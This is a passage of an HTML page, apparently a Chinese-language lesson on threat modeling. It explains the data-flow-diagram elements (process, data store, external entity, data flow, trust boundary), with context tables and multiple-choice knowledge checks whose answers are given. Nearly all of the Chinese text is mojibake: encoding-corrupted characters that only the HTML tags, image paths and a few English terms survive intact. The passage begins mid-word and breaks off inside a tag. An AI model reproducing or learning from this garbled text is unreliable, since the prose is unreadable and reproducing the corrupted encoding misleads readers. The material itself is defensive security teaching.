¹æ®æ•°æ®æµå…³ç³»å›¾æ‰€éœ€çš„ä¿¡æ¯æ·±åº¦çº§åˆ«ï¼Œå¯ä»¥ä½¿ç”¨è¿‡ç¨‹å…ƒç´ æ¥è¡¨ç¤ºå‡ ä¸ªä¸åŒçš„ç”¨ä¾‹ï¼š</p><table><thead><tr><th align="left">ç”¨ä¾‹</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">å­˜æ ¹</td><td align="left">åœ¨è¾ƒé«˜çº§åˆ«çš„æ•°æ®æµå…³ç³»å›¾ä¸­å°†è¿‡ç¨‹å…ƒç´ ç”¨ä½œâ€œå­˜æ ¹â€ï¼Œè¿™æ˜¯ä¸€ç§æœ‰åŠ©äºä¿æŒæ•´æ´çš„å¥½æ–¹æ³•ã€‚ å®ƒæ¶‰åŠä¸ºç‰¹å®šè¿‡ç¨‹åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œå¹¶å°†å…¶æ˜ å°„å›æ›´é«˜çº§åˆ«çš„å…³ç³»å›¾ã€‚ å®ƒçš„å·¥ä½œæ–¹å¼ç±»ä¼¼äºâ€œæ”¾å¤§â€åŠŸèƒ½ï¼Œåœ¨â€œæ”¾å¤§â€è¿‡ç¨‹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ·±å±‚æ•°æ®æµå…³ç³»å›¾ã€‚</td></tr><tr><td align="left">å¤šä¸ªä»»åŠ¡</td><td align="left">å½“è¿‡ç¨‹å¤„ç†å¤šä¸ªä»»åŠ¡æ—¶ï¼Œæ­¤ç”¨ä¾‹é€‚ç”¨ã€‚ æ­¤ä¸Šä¸‹æ–‡éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸æŸ¥çœ‹æ•°æ®æµç¨‹å›¾çš„ä»»ä½•äººä¸ºæ¯ä¸ªä»»åŠ¡åº”ç”¨é€‚å½“çš„å®‰å…¨æ§åˆ¶ã€‚</td></tr></tbody></table><h4 id="åŒ…æ‹¬ä¸Šä¸‹æ–‡"><a href="#åŒ…æ‹¬ä¸Šä¸‹æ–‡" class="headerlink" title="åŒ…æ‹¬ä¸Šä¸‹æ–‡"></a>åŒ…æ‹¬ä¸Šä¸‹æ–‡</h4><p>åœ¨æ¯ä¸ªè¿‡ç¨‹å…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š</p><table><thead><tr><th align="left">ä¸Šä¸‹æ–‡</th><th align="left">é—®é¢˜</th></tr></thead><tbody><tr><td align="left">ä»£ç </td><td align="left">æ­¤è¿‡ç¨‹æ˜¯å¦ä»¥ C#ã€C++ã€Objective Cã€Java æˆ–è„šæœ¬è¯­è¨€è¿è¡Œï¼Ÿ</td></tr><tr><td align="left">æƒé™çº§åˆ«</td><td align="left">æ­¤è¿‡ç¨‹æ˜¯å¦éœ€è¦å†…æ ¸ã€æœ¬åœ°æˆ–ç®¡ç†çº§åˆ«æƒé™æ‰èƒ½è¿è¡Œï¼Ÿ</td></tr><tr><td align="left">æœåŠ¡éš”ç¦»</td><td align="left">è¯¥è¿‡ç¨‹æ˜¯å¦åœ¨æ²™ç›’ä¸­è¿è¡Œï¼Ÿ</td></tr><tr><td align="left">è¾“å…¥</td><td align="left">æ­¤è¿‡ç¨‹å¯ä»¥æ¥å—æ‰€æœ‰äººã€æœ¬åœ°å¸æˆ·è¿˜æ˜¯ä»…é™ç®¡ç†å‘˜çš„è¾“å…¥ï¼Ÿ</td></tr><tr><td align="left">éªŒè¯</td><td align="left">æ­¤è¿‡ç¨‹å¦‚ä½•åˆ†æã€å¤„ç†å’Œæ¥å—è¾“å…¥ï¼Ÿ</td></tr><tr><td align="left">èº«ä»½éªŒè¯</td><td align="left">æ­¤è¿‡ç¨‹æ˜¯å¦ä¾èµ–äº Azure Active Directory è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ</td></tr><tr><td align="left">æˆæƒ</td><td align="left">å®ƒæ˜¯å¦ä¾èµ–äºè®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) è¿›è¡Œæˆæƒï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œæˆæƒï¼Ÿ</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-4"><a href="#çŸ¥è¯†æ£€æŸ¥-4" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°è¿‡ç¨‹ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web é—¨æˆ·è¦æ±‚ç”¨æˆ·æä¾›å…¶å‡­æ®ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç¼“å­˜ä¸ºç”¨æˆ·å­˜å‚¨ä¸æœåŠ¡ç›¸å…³çš„ Cookieã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç¬¬ä¸‰æ–¹ API å‘å…¶è¯·æ±‚è€…å‘é€è¯·æ±‚çš„æ•°æ®ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. é—¨æˆ·å°†å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶å‘é€åˆ°è¿‡ç¨‹çš„ä¸‹ä¸€éƒ¨åˆ†ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚</psw></p><h3 id="æ•°æ®å­˜å‚¨-å­˜å‚¨å…ƒç´ "><a href="#æ•°æ®å­˜å‚¨-å­˜å‚¨å…ƒç´ " class="headerlink" title="æ•°æ®å­˜å‚¨ - å­˜å‚¨å…ƒç´ "></a>æ•°æ®å­˜å‚¨ - å­˜å‚¨å…ƒç´ </h3><p><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></p><p>æ­¤å…ƒç´ ç”¨å¹³è¡Œçº¿è¡¨ç¤ºï¼Œè¡¨ç¤º<u><strong>ä¸´æ—¶æˆ–æ°¸ä¹…å­˜å‚¨çš„æ•°æ®</strong></u>ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ä½¿ç”¨æµè§ˆå™¨ç¼“å­˜æ¥å­˜å‚¨ä¸ç”¨æˆ·ä¼šè¯ç›¸å…³çš„æ•°æ®</li><li>å‘æ•°æ®åº“æ·»åŠ å®‰å…¨æ—¥å¿—äº‹ä»¶</li></ul><h4 id="ä½•æ—¶ä½¿ç”¨æ•°æ®å­˜å‚¨å…ƒç´ "><a href="#ä½•æ—¶ä½¿ç”¨æ•°æ®å­˜å‚¨å…ƒç´ " class="headerlink" title="ä½•æ—¶ä½¿ç”¨æ•°æ®å­˜å‚¨å…ƒç´ "></a>ä½•æ—¶ä½¿ç”¨æ•°æ®å­˜å‚¨å…ƒç´ </h4><ul><li>åœ¨æ¯æ¬¡å°†æ•°æ®å­˜å‚¨åœ¨ Azure DB æˆ–æœ¬åœ°ç¼“å­˜ç­‰ä½ç½®æ—¶</li><li>å¦‚æœè¦åœ¨ä¸¤ä¸ªæ•°æ®å­˜å‚¨ä¹‹é—´å»ºç«‹é€šä¿¡ï¼Œè¯·ä¸è¦å¿˜è®°åœ¨å®ƒä»¬ä¹‹é—´æ·»åŠ è¿›ç¨‹</li><li>æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“éƒ½å¯å¯åŠ¨æ•°æ®æµï¼Œå› æ­¤è¯·éªŒè¯è¿™ä¸¤è€…ä¸­çš„ä»»æ„ä¸€ä¸ªæ˜¯å¦å·²å°±ç»ª</li><li>ç¡®ä¿å°†æ•°æ®åæœŸå¤„ç†åŒ…å«åœ¨å†…ï¼Œä¾‹å¦‚ Azure Analytics ç­‰åˆ†ææœåŠ¡ã€‚ æ­¤è¿‡ç¨‹ç»å¸¸è¢«å¿½ç•¥ã€‚</li></ul><h4 id="åŒ…å«ä¸Šä¸‹æ–‡"><a href="#åŒ…å«ä¸Šä¸‹æ–‡" class="headerlink" title="åŒ…å«ä¸Šä¸‹æ–‡"></a>åŒ…å«ä¸Šä¸‹æ–‡</h4><p>åœ¨æ¯ä¸ªæ•°æ®å­˜å‚¨å…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š</p><table><thead><tr><th align="left">ä¸Šä¸‹æ–‡</th><th align="left">é—®é¢˜</th></tr></thead><tbody><tr><td align="left">ç±»å‹</td><td align="left">ç³»ç»Ÿæ˜¯å¦ä½¿ç”¨ Azure SQLã€Cookieã€æœ¬åœ°æˆ–å…¶ä»–æŸç§ç±»å‹çš„å­˜å‚¨ï¼Ÿ å¦‚æœæ˜¯ï¼Œç³»ç»Ÿä½¿ç”¨çš„æ˜¯å“ªç§å­˜å‚¨ï¼Ÿ</td></tr><tr><td align="left">åŠŸèƒ½</td><td align="left">å¦‚ä½•ä½¿ç”¨å­˜å‚¨ï¼Ÿ å®ƒæ˜¯å¦ç”¨äºå…±äº«æ•°æ®ã€å­˜å‚¨å¤‡ä»½ã€å®‰å…¨æ—¥å¿—ã€å‡­æ®å’Œæœºå¯†ï¼Ÿ</td></tr><tr><td align="left">æƒé™çº§åˆ«</td><td align="left">å¦‚ä½•å®ç°è®¿é—®æ§åˆ¶ï¼Ÿ æ‹¥æœ‰è¯»å†™æƒé™çš„äººå‘˜æœ‰å“ªäº›ï¼Ÿ</td></tr><tr><td align="left">å…¶ä»–æ§åˆ¶</td><td align="left">æ•°æ®æ˜¯å¦åŠ å¯†ï¼Ÿ ç£ç›˜æ˜¯å¦åŠ å¯†ï¼Ÿ æ˜¯å¦ä½¿ç”¨æ•°å­—ç­¾åï¼Ÿ</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-5"><a href="#çŸ¥è¯†æ£€æŸ¥-5" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°æ•°æ®å­˜å‚¨ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web é—¨æˆ·è¦æ±‚ç”¨æˆ·æä¾›å…¶å‡­æ®ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç¼“å­˜ä¸ºç”¨æˆ·å­˜å‚¨ä¸æœåŠ¡ç›¸å…³çš„ Cookieã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç¬¬ä¸‰æ–¹ API å‘å…¶è¯·æ±‚è€…å‘é€è¯·æ±‚çš„æ•°æ®ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== B ==</psw></p><p>è§£é‡Šï¼š<psw>A. å¤„ç†è¾“å…¥å’Œè¾“å‡ºçš„è¡Œä¸ºæ˜¯ä¸è¿‡ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚</psw></p><h3 id="å¤–éƒ¨å®ä½“-æ— æ§åˆ¶å…ƒç´ "><a href="#å¤–éƒ¨å®ä½“-æ— æ§åˆ¶å…ƒç´ " class="headerlink" title="å¤–éƒ¨å®ä½“ - æ— æ§åˆ¶å…ƒç´ "></a>å¤–éƒ¨å®ä½“ - æ— æ§åˆ¶å…ƒç´ </h3><p><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></p><p>å¤–éƒ¨å®ä½“å…ƒç´ ç”±æ­£æ–¹å½¢è¡¨ç¤ºï¼Œ<u><strong>å¤–éƒ¨å®ä½“å¯ä»¥æ˜¯è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ï¼Œç”šè‡³æ˜¯ç›´æ¥æ§åˆ¶ä¹‹å¤–çš„å®Œæ•´ç³»ç»Ÿ</strong></u>ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ä¸æœåŠ¡äº¤äº’çš„ç”¨æˆ·</li><li>ä¸ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯æœåŠ¡ç´§å¯†é›†æˆ</li><li>ç»„ç»‡å†…ç”±å…¶ä»–å›¢é˜Ÿåˆ›å»ºçš„æœåŠ¡</li></ul><h4 id="ä½•æ—¶ä½¿ç”¨å¤–éƒ¨å®ä½“å…ƒç´ "><a href="#ä½•æ—¶ä½¿ç”¨å¤–éƒ¨å®ä½“å…ƒç´ " class="headerlink" title="ä½•æ—¶ä½¿ç”¨å¤–éƒ¨å®ä½“å…ƒç´ "></a>ä½•æ—¶ä½¿ç”¨å¤–éƒ¨å®ä½“å…ƒç´ </h4><ul><li>åœ¨è¦è¡¨ç¤ºä¸èƒ½ç›´æ¥ä¿®æ”¹çš„å†…å®¹æ—¶</li><li>æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“éƒ½å¯å¯åŠ¨æ•°æ®æµï¼Œå› æ­¤è¯·éªŒè¯è¿™ä¸¤è€…ä¸­çš„ä»»æ„ä¸€ä¸ªæ˜¯å¦å·²å°±ç»ª</li></ul><h4 id="åŒ…å«ä¸Šä¸‹æ–‡-1"><a href="#åŒ…å«ä¸Šä¸‹æ–‡-1" class="headerlink" title="åŒ…å«ä¸Šä¸‹æ–‡"></a>åŒ…å«ä¸Šä¸‹æ–‡</h4><p>åœ¨æ¯ä¸ªå¤–éƒ¨å®ä½“å…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š</p><table><thead><tr><th align="left">ä¸Šä¸‹æ–‡</th><th align="left">é—®é¢˜</th></tr></thead><tbody><tr><td align="left">æº</td><td align="left">å®ä½“æ˜¯å†…éƒ¨å®ä½“è¿˜æ˜¯å¤–éƒ¨å®ä½“ï¼Ÿ</td></tr><tr><td align="left">ç±»å‹</td><td align="left">å®ä½“æ˜¯ç”¨æˆ·ã€æœåŠ¡æä¾›å•†è¿˜æ˜¯ Web æœåŠ¡ï¼Ÿ</td></tr><tr><td align="left">èº«ä»½éªŒè¯</td><td align="left">æ­¤è¿‡ç¨‹æ˜¯å¦ä¾èµ–äº Azure Active Directory è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ</td></tr><tr><td align="left">æˆæƒ</td><td align="left">å®ƒæ˜¯å¦ä¾èµ–äºè®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) è¿›è¡Œæˆæƒï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œæˆæƒï¼Ÿ</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-6"><a href="#çŸ¥è¯†æ£€æŸ¥-6" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€å‡†ç¡®åœ°æè¿°äº†å¤–éƒ¨å®ä½“ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web é—¨æˆ·è¦æ±‚ç”¨æˆ·æä¾›å…¶å‡­æ®ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç¼“å­˜ä¸ºç”¨æˆ·å­˜å‚¨ä¸æœåŠ¡ç›¸å…³çš„ Cookieã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç¬¬ä¸‰æ–¹ API å‘å…¶è¯·æ±‚è€…å‘é€è¯·æ±‚çš„æ•°æ®ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== C ==</psw></p><p>è§£é‡Šï¼š<psw>A. å¤„ç†è¾“å…¥å’Œè¾“å‡ºçš„è¡Œä¸ºæ˜¯ä¸è¿‡ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚ è¿™ C ç­”æ¡ˆçš„è§£é‡Šå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Ÿåº”è¯¥è§£é‡Šä¸º ç¬¬ä¸‰æ–¹ API å‘è¯·æ±‚è€…å¯åŠ¨äº†æ•°æ®æµï¼Ÿ</psw></p><h3 id="æ•°æ®æµ-ä¼ è¾“å…ƒç´ ä¸­çš„æ•°æ®"><a href="#æ•°æ®æµ-ä¼ è¾“å…ƒç´ ä¸­çš„æ•°æ®" class="headerlink" title="æ•°æ®æµ - ä¼ è¾“å…ƒç´ ä¸­çš„æ•°æ®"></a>æ•°æ®æµ - ä¼ è¾“å…ƒç´ ä¸­çš„æ•°æ®</h3><p><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></p><p>å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ç”¨æ–¹å‘ç®­å¤´è¡¨ç¤ºï¼Œ**<u>ç”¨äºæŒ‡ç¤ºæ•°æ®æºå’Œç›®æ ‡ä¹‹é—´çš„é€šä¿¡</u>**ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç”¨æˆ·æäº¤çš„ç”¨äºè®¿é—®æœåŠ¡çš„å‡­æ®</li><li>è¿‡ç¨‹å‘å‡ºçš„å‘æ•°æ®å­˜å‚¨æ·»åŠ é¡¹çš„è¯·æ±‚</li></ul><h4 id="ä½•æ—¶ä½¿ç”¨æ•°æ®æµå…ƒç´ "><a href="#ä½•æ—¶ä½¿ç”¨æ•°æ®æµå…ƒç´ " class="headerlink" title="ä½•æ—¶ä½¿ç”¨æ•°æ®æµå…ƒç´ "></a>ä½•æ—¶ä½¿ç”¨æ•°æ®æµå…ƒç´ </h4><ul><li>åœ¨æ¯ä¸ªå…ƒç´ äº¤äº’ä¹‹é—´</li><li>è°ƒå‡ºæ­£åœ¨ä¼ è¾“çš„æ•°æ®ç±»å‹ï¼Œå¹¶åŒ…æ‹¬å…¶ä¼ è¾“æ–¹å¼</li><li>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒåŒ…æ‹¬å¯¹æ¯ä¸ªè¯·æ±‚çš„å“åº”</li></ul><h4 id="åŒ…å«ä¸Šä¸‹æ–‡-2"><a href="#åŒ…å«ä¸Šä¸‹æ–‡-2" class="headerlink" title="åŒ…å«ä¸Šä¸‹æ–‡"></a>åŒ…å«ä¸Šä¸‹æ–‡</h4><p>åŒ…å«æ¯ä¸ªæ•°æ®æµå…ƒç´ çš„ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š</p><table><thead><tr><th align="left">ä¸Šä¸‹æ–‡</th><th align="left">é—®é¢˜</th></tr></thead><tbody><tr><td align="left">æè¿°</td><td align="left">æ•°æ®æµæ˜¯å¦ä¼ é€’ä¼šè¯ä»¤ç‰Œã€SQL å­—ç¬¦ä¸²æˆ–ç”¨æˆ·å‡­æ®ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆæ•°æ®æµä¼ é€’å“ªäº›å†…å®¹ï¼Ÿ</td></tr><tr><td align="left">åè®®</td><td align="left">æµä½¿ç”¨ HTTPS è¿˜æ˜¯ SOAPï¼Ÿ å¦‚æœéƒ½ä¸æ˜¯ï¼Œé‚£ä¹ˆæµä½¿ç”¨çš„æ˜¯ä»€ä¹ˆåè®®ï¼Ÿ</td></tr><tr><td align="left">æµåºåˆ—</td><td align="left">ç³»ç»Ÿæ˜¯å¦æšä¸¾æ•°æ®æµä»¥ä¾¿æ›´å®¹æ˜“éµå¾ªæµåºåˆ—ï¼Ÿ</td></tr><tr><td align="left">ç±»å‹</td><td align="left">æ•°æ®æµä¸­åŒ…å«å“ªäº›ç±»å‹çš„æ•°æ®ï¼Ÿ Cookieï¼Ÿ XMLï¼Ÿ SOAP æœ‰æ•ˆè´Ÿè½½ï¼Ÿ REST æœ‰æ•ˆè´Ÿè½½ï¼Ÿ JSON æœ‰æ•ˆè´Ÿè½½ï¼Ÿ</td></tr><tr><td align="left">å…¶ä»–æ§åˆ¶</td><td align="left">æ•°æ®æµæ˜¯å¦å¯ç”¨äº†ä¼ªé€ ä¿æŠ¤ï¼Ÿ æ˜¯å¦å¯ç”¨äº†å…¶ä»–å®‰å…¨æ ‡å¿—ï¼Ÿ</td></tr><tr><td align="left">èº«ä»½éªŒè¯</td><td align="left">æ­¤è¿‡ç¨‹æ˜¯å¦ä¾èµ–äº Azure Active Directory è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ</td></tr><tr><td align="left">æˆæƒ</td><td align="left">å®ƒæ˜¯å¦ä¾èµ–äºè®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) è¿›è¡Œæˆæƒï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œæˆæƒï¼Ÿ</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-7"><a href="#çŸ¥è¯†æ£€æŸ¥-7" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°æ•°æ®æµï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ç”¨æˆ·å‡­æ®ä»è¿‡ç¨‹ä¼ è¾“åˆ°èº«ä»½éªŒè¯æœåŠ¡æä¾›å•†ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. å­˜å‚¨ä¼šè¯ä»¤ç‰Œä»¥ä¾›ä»¥åä½¿ç”¨ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç¬¬ä¸‰æ–¹ API å¤„ç†æœåŠ¡åˆ†æè¯·æ±‚ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. å¤„ç†æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸è¿‡ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚</psw></p><h3 id="ä¿¡ä»»è¾¹ç•Œ-ä¿¡ä»»åŒºåŸŸæ›´æ”¹å…ƒç´ "><a href="#ä¿¡ä»»è¾¹ç•Œ-ä¿¡ä»»åŒºåŸŸæ›´æ”¹å…ƒç´ " class="headerlink" title="ä¿¡ä»»è¾¹ç•Œ - ä¿¡ä»»åŒºåŸŸæ›´æ”¹å…ƒç´ "></a>ä¿¡ä»»è¾¹ç•Œ - ä¿¡ä»»åŒºåŸŸæ›´æ”¹å…ƒç´ </h3><p>ä¿¡ä»»è¾¹ç•Œæ¡†</p><p><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"></p><p>ä¿¡ä»»è¾¹ç•Œçº¿</p><p><img src="/img/thread-modeling/trust-boundary-line50-7523829.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50-7523829.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></p><p>ä¿¡ä»»è¾¹ç•Œç”¨è™šçº¿æˆ–æ–¹æ¡†è¡¨ç¤ºï¼Œç”¨äº<u><strong>æè¿°è·¨ä¸åŒä¿¡ä»»åŒºåŸŸçº§åˆ«çš„æ•°æ®æµ</strong></u>ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>é˜²ç«å¢™</li><li>ä¸ç¬¬ä¸‰æ–¹æœåŠ¡çš„è¿æ¥</li><li>ç³»ç»Ÿçš„æŸäº›éƒ¨åˆ†ä»…å¯¹ç®¡ç†å‘˜å¯ç”¨</li></ul><div class="note radiation red"><p>ä¿¡ä»»åŒºåŸŸä¸æ–­å˜åŒ–çš„åŒºåŸŸæœ€æ˜“å—åˆ°æ”»å‡»è€…çš„æ”»å‡»ï¼Œåº”è°¨æ…è®¾è®¡æ­¤ç±»åŒºåŸŸã€‚</p></div><p>Microsoft å·²é¢„å®šä¹‰äº†ä¸€äº›ä¾›å·¥ç¨‹å¸ˆå†…éƒ¨ä½¿ç”¨çš„ä¿¡ä»»åŒºåŸŸè¦æ±‚ã€‚ä½ èƒ½æ¸…æ¥šåœ°ç¡®å®šè¦åº”ç”¨å“ªäº›è¾¹ç•Œã€‚å¯¹äº Microsoft çš„å‘˜å·¥ï¼Œè¯·ä¸å®‰å…¨å›¢é˜Ÿè”ç³»ä»¥äº†è§£è¯¦ç»†ä¿¡æ¯ã€‚</p><h4 id="ä½•æ—¶ä½¿ç”¨ä¿¡ä»»è¾¹ç•Œå…ƒç´ "><a href="#ä½•æ—¶ä½¿ç”¨ä¿¡ä»»è¾¹ç•Œå…ƒç´ " class="headerlink" title="ä½•æ—¶ä½¿ç”¨ä¿¡ä»»è¾¹ç•Œå…ƒç´ "></a>ä½•æ—¶ä½¿ç”¨ä¿¡ä»»è¾¹ç•Œå…ƒç´ </h4><p>å…³äºä¿¡ä»»è¾¹ç•Œï¼Œéœ€è¦è®°ä½ä»¥ä¸‹å‡ ä¸ªè¦ç‚¹ï¼š</p><ul><li>åŒ…å«ä¿¡ä»»è¾¹ç•Œä»¥å¤„ç†è·¨ä¸åŒä¿¡ä»»åŒºåŸŸçš„æ•°æ®æµ</li><li>ä¿¡ä»»è¾¹ç•Œçº¿ç”¨äºè¡¨ç¤ºè·¨å¤§å‹ç¯å¢ƒï¼ˆä¾‹å¦‚ Internetï¼‰çš„æ•°æ®æµ</li><li>ä¿¡ä»»è¾¹ç•Œæ¡†è¡¨ç¤ºå°å‹ç¯å¢ƒï¼Œä¾‹å¦‚æ²™ç›’ç¯å¢ƒå’Œä¼ä¸šç½‘ç»œ</li></ul><h4 id="åŒ…å«ä¸Šä¸‹æ–‡-3"><a href="#åŒ…å«ä¸Šä¸‹æ–‡-3" class="headerlink" 